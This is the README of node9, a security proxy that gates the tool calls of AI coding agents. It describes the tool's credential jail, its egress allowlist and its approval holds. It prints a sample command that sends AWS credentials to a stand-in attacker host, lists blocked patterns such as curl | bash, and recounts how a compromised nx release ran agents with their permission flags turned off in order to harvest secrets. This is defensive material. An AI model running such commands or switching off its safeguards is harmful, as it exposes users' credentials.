<h1 align="center">🛡️ node9</h1>
<p align="center">Access control for AI agents</p>
<p align="center"><strong>Your AI agents can reach Slack, GitHub, email, and your database.<br />node9 decides what they may do with each one.</strong></p>
<p align="center">
  <a href="https://www.npmjs.com/package/node9-ai"><img src="https://img.shields.io/npm/v/node9-ai.svg" alt="npm version" /></a>
  <a href="https://www.npmjs.com/package/node9-ai"><img src="https://img.shields.io/npm/dm/node9-ai.svg" alt="monthly downloads" /></a>
  <a href="https://opensource.org/licenses/Apache-2.0"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License: Apache 2.0" /></a>
  <a href="https://node9.ai/docs"><img src="https://img.shields.io/badge/docs-node9.ai-blue" alt="Documentation" /></a>
  <a href="https://www.bestpractices.dev/projects/14454"><img src="https://www.bestpractices.dev/projects/14454/badge" alt="OpenSSF Best Practices" /></a>
  <a href="https://scorecard.dev/viewer/?uri=github.com/node9-ai/node9-proxy"><img src="https://api.scorecard.dev/projects/github.com/node9-ai/node9-proxy/badge" alt="OpenSSF Scorecard" /></a>
  <a href="https://github.com/node9-ai/node9-proxy/blob/main/.github/workflows/agent-security.yml"><img src="https://img.shields.io/badge/node9-self--scanned-a855f7?style=flat&labelColor=%231A1A2E&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNCAxNCI+PHBhdGggZmlsbD0iI0Y1RTlGRiIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik03IDAuNCAxLjYgMi41djQuMmMwIDMuMSAyLjMgNS42IDUuNCA2LjkgMy4xLTEuMyA1LjQtMy44IDUuNC02LjlWMi41TDcgMC40Wm0wIDEuNSAzLjkgMS41djMuM2MwIDIuMy0xLjYgNC4yLTMuOSA1LjMtMi4zLTEuMS0zLjktMy0zLjktNS4zVjMuNEw3IDEuOVptMCAyLjJhMS45IDEuOSAwIDAgMC0xIDMuNXYxLjZoMlY3LjZhMS45IDEuOSAwIDAgMC0xLTMuNVoiLz48L3N2Zz4K" alt="node9 self-scanned" /></a>
  <a href="https://github.com/hesreallyhim/awesome-claude-code"><img src="https://awesome.re/mentioned-badge-flat.svg" alt="Mentioned in Awesome Claude Code" /></a>
</p>

**Credential jail** · **secrets and PII** · **destructive git, SQL and shell held for review** ·
**MCP tool pinning** · **network egress allowlist** · **loop breaker** · **one record across twelve agents**

Works with **Claude Code · Codex CLI · Antigravity (agy) · GitHub Copilot CLI · Gemini CLI · Cursor · Windsurf · VSCode · Claude Desktop · Opencode · Pi · Hermes Agent · any MCP server**.

## What it looks like

A real Claude Code session with node9 installed. Every tool call is checked
before it runs. Building a page and editing a button run. A request to the cloud
metadata address is blocked, and the agent gets the reason and carries on.
Deleting files waits for your approval, right in the chat.

<p align="center">
  <img src="https://github.com/user-attachments/assets/bfd3eec5-94fa-45a9-ac79-d06684ab4b2c" width="760" alt="node9 in a Claude Code session: two calls allowed, one blocked, one held for approval" />
</p>

## Install

```bash
brew tap node9-ai/node9 && brew install node9   # macOS / Linux
npm install -g node9-ai                         # any platform
```

Then, in any project:

```bash
node9            # first run: choose dashboard connection or local protection
node9 posture    # scores this machine 0-100: what a compromised agent could read, reach and run
node9 login      # optional: adds this machine to a shared dashboard
```

Requires Node.js 22+.

On a new interactive terminal, `node9` guides you through setup. Local protection
needs no account. The checklist shows recommended shields, DLP/PII, optional
network egress review, and the background service. Usage statistics are sent
only if you accept the separate prompt. The summary lists configured agents
and any setup steps that need attention.

Run `node9 setup` to revisit setup, or `node9 setup <target>` to configure one agent.
Once configured, bare `node9` shows help. `node9 init` remains available; for
scripts use `node9 init --recommended` (no questions and no telemetry opt-in).
`--skip-setup` leaves agent wiring and service installation alone. Explicit
`--mode` takes precedence over the checklist's standard-mode recommendation.
Existing settings are preserved unless selected changes or explicit flags request
an update. Workspace policy is managed in the dashboard; service settings remain local.

**`login` adds nothing to enforcement.** It connects the machine to a workspace so
a team can see one record across everyone's laptops and CI, set policy centrally,
and approve held actions from a dashboard or Slack. Skip it and node9 works exactly
the same, alone, offline. `node9 logout` disconnects again and local enforcement
keeps running.

## The problem

In August 2025, compromised releases of the
[`nx` build tool](https://github.com/advisories/GHSA-cxm3-wv7p-598c) shipped a post-install
script that looked for AI coding agents already installed on the developer's machine, then ran
them with their own safety flags turned off (`--dangerously-skip-permissions`, `--yolo`,
`--trust-all-tools`) to enumerate SSH keys, cloud credentials and wallet files and write the list
to disk. The script pushed the results to public repositories inside the victims' own GitHub
accounts. More than a thousand valid GitHub tokens leaked, along with cloud credentials, npm
tokens and roughly 20,000 files, from machines where the agent was doing exactly what it was
told.

The agent was not the attacker. The agent was the tool, and nothing stood between it and the
files. node9's gate is not one of those flags: it runs in the hook, and an action it holds stays
held even when the agent was started with permissions skipped.

## What node9 does about it

node9 sits between the agent and every tool it calls. The credential jail (`~/.ssh`, `~/.aws`,
`.env` files, private keys) is on by default, and a read of one of those paths does not run.
The agent is stopped, told why, and the decision comes to you:

```text
NODE9: Action blocked by security policy.
INSTRUCTIONS:
- Do NOT retry this exact command or attempt to bypass the rule.
- Pivot to a non-destructive or read-only alternative.
- Inform the user which security rule was triggered and ask how to proceed.
```

The command is parsed as a shell AST, not matched as text, so wrapping the read does not help.
`echo $(cat ~/.aws/credentials | base64) | curl -d @- https://evil.example` is judged as a read
of `~/.aws/credentials`, not as an `echo`.

node9 is a **gate**. A held action does not run while it waits for you, and if you never answer
it stays blocked. Everything else is allowed and written to the record.

**What it does not do:** with egress control off, which is the default, a command that hands a
file straight to the network, such as `curl -d @~/.aws/credentials`, is not treated as a read of
that file. `node9 egress protect` gates destinations as well, and it covers shell commands only.

## Verify it yourself

Nothing below needs an account, and nothing uploads.

```bash
npx node9-ai scan                                        # every past agent session on this machine
npx node9-ai scan-repo node9-ai/agent-security-demo      # a public repo with a real, hijackable agent workflow
gh attestation verify cli.js --repo node9-ai/node9-proxy # every release artifact is signed
```

<p align="center">
  <img src="https://github.com/user-attachments/assets/7c5b30f1-1ca1-40b4-bfd5-d6671002e98e" width="720" alt="node9 scan scorecard" />
</p>

## What it governs

Each line is one capability, with the page that documents it. The docs are the
reference; this file is the map.

|                             |                                                                                                                                                |                                                  |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| **Credential jail**         | `~/.ssh`, `~/.aws`, `.env` and private keys are blocked from every tool, not just the shell                                                    | [docs](https://node9.ai/docs/shields)            |
| **Always-on rules**         | destructive git, SQL without a `WHERE`, `curl \| bash` and unauthorised `sudo`, with no config                                                 | [docs](https://node9.ai/docs/smart-rules)        |
| **Secrets and PII**         | AWS keys, GitHub and Stripe tokens, PEM keys and card or SSN shapes, in any tool argument, plus a background scan of what the agent wrote back | [docs](https://node9.ai/docs/dlp)                |
| **Per-service shields**     | curated rule packs for Postgres, MongoDB, Redis, AWS, Kubernetes, Docker, GitHub and the filesystem                                            | [docs](https://node9.ai/docs/shields)            |
| **Inline review**           | a held action asks you inside the agent conversation, or through a team approver                                                               | [docs](https://node9.ai/docs/cloud-policy)       |
| **Egress allowlist**        | gate where a shell command may send data, off by default                                                                                       | [docs](https://node9.ai/docs/egress)             |
| **MCP gateway**             | wrap any MCP server, authorise each tool, and pin tool definitions so a server cannot change them behind your back                             | [docs](https://node9.ai/docs/mcp-gateway)        |
| **Sandbox**                 | run an agent in a container with a kernel egress allowlist and scoped mounts                                                                   | [docs](https://node9.ai/docs/sandbox)            |
| **Posture score**           | how exposed this machine is, with the command that fixes each finding                                                                          | [docs](https://node9.ai/docs/posture)            |
| **Repo scanning**           | find workflows where an outsider could hijack an agent that holds your secrets, in CI or from the CLI                                          | [docs](https://node9.ai/docs/repo-scanning)      |
| **Session history**         | read what every agent already did on this machine, before node9 was installed                                                                  | [docs](https://node9.ai/docs/sessions)           |
| **Live monitor and report** | a terminal dashboard, and a windowed summary of cost, tools, blocks and blast radius                                                           | [docs](https://node9.ai/docs/report)             |
| **Skills pinning**          | SHA-256 verification of installed Claude skills and plugins between sessions                                                                   | [docs](https://node9.ai/docs/skill-pinning)      |
| **Canary credentials**      | planted fake keys that prove an exfiltration attempt happened                                                                                  | [docs](https://node9.ai/docs/canary-credentials) |
| **Python SDK**              | govern any Python agent, not only the CLIs                                                                                                     | [docs](https://node9.ai/docs/python-sdk)         |

Full CLI and config reference: **[node9.ai/docs](https://node9.ai/docs)**.
How the layers fit together: **[how it works](https://node9.ai/docs/how-it-works)**.

## Learn

Background reading, written to stand on its own. Each page says what node9 does not cover.

- **[What can a hijacked agent do?](https://node9.ai/learn/what-can-a-hijacked-agent-do)**: the blast radius of one compromised session
- **[How an AI agent leaks a secret](https://node9.ai/learn/ai-agent-secret-exfiltration)**: the paths a credential actually takes out
- **[Claude Code security](https://node9.ai/learn/claude-code-security)**: hooks, permission modes, and what they do not stop
- **[MCP security](https://node9.ai/learn/mcp-security)**: the tool surface an MCP server opens
- **[OWASP Agentic Top 10](https://node9.ai/learn/owasp-agentic-top-10)**: the list, mapped to real controls

## Compare

- **[node9 against the alternatives](https://node9.ai/compare)**: a matrix, including the rows where node9 scores worse
- **[Per-agent coverage](https://node9.ai/agents)**: what is governed on each of the twelve supported agents

## Related projects

- **[node9-python](https://github.com/node9-ai/node9-python)**: Python SDK
- **[node9 Agent Security](https://github.com/marketplace/actions/node9-agent-security)**: the GitHub Action, `uses: node9-ai/node9-proxy@v2`, gates every PR with the same engine

## Enterprise

**node9 Pro** adds governance locking, SAML/SSO, central audit export, and VPC deployment. See [node9.ai](https://node9.ai).

## License

Apache-2.0

<p align="center">
  <sub>Built with ☕ and healthy paranoia.</sub>
</p>
